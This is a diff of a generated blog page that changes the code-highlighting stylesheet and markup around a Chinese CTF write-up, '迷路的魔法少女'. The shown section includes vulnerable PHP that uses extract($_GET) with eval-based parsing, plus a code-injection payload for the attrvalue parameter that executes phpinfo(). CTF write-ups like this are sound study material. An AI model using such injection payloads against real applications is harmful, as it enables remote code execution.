@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -245,7 +253,7 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+              <h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);
 
 extract($_GET);
@@ -273,7 +281,7 @@ error_reporting(<span class="hljs-number">0</span>);
         $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;
 &#125;
 
-String2Array($attrstr);</code></pre></div>
+String2Array($attrstr);</code></pre>
 
 <p>突破点在<code>attrvalue</code>上</p>
 <p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p>
@@ -436,6 +444,8 @@ String2Array($attrstr);</code></pre></div>
 
 
 
+  
+    
   
 
 
